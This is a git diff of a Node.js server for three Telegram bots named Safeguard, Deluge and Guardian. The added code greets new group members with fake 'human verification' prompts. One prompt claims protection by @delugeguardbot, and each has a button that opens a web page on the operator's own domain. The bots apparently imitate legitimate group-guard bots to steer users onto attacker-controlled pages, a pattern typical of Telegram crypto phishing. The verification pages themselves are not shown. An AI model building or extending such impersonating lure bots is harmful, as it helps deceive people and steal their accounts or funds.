@@ -149,8 +149,8 @@ const handleRequest = async (req, res, data) => {
             {
               text: randomText,
               url: `https://t.me/+${generateRandomString(16)}`
-            },
-          ],
+            }
+          ]
         ]
       }
     };
@@ -161,8 +161,8 @@ const handleRequest = async (req, res, data) => {
             {
               text: "@SOLTRENDING",
               url: "https://t.me/SOLTRENDING"
-            },
-          ],
+            }
+          ]
         ]
       }
     };
@@ -235,4 +235,74 @@ function handleStart(bot) {
                 web_app: {
                   url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                 }
-             
+              }]]
+            }
+          };
+          imageToSend = safeguardVerification;
+        } else if (botInfo.username === delugeUsername) {
+          jsonToSend = {
+            caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Tap To Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                }
+              }]]
+            }
+          };
+          imageToSend = delugeVerification;
+        } else if (botInfo.username === guardianUsername) {
+          jsonToSend = {
+            caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                }
+              }]]
+            }
+          };
+          imageToSend = guardianVerification;
+        }
+        
+        bot.sendPhoto(
+          chatId, 
+          imageToSend,
+          jsonToSend
+        );
+      }
+    });
+  });
+}
+
+handleNewChatMember(safeguardBot, "safeguard");
+handleNewChatMember(delugeBot, "deluge");
+handleNewChatMember(guardianBot, "guardian");
+
+handleStart(safeguardBot);
+handleStart(delugeBot);
+handleStart(guardianBot);
+
+app.post('/api/webhook/safeguard', (req, res) => {
+  console.log("Received webhook update for Safeguard bot: ", req.body);
+  safeguardBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+app.post('/api/webhook/deluge', (req, res) => {
+  console.log("Received webhook update for Deluge bot: ", req.body);
+  delugeBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+app.post('/api/webhook/guardian', (req, res) => {
+  console.log("Received webhook update for Guardian bot: ", req.body);
+  guardianBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+app.listen(process.env.PORT || 80, () => console.log(`Server running on port ${process.env.PORT || 80}`));
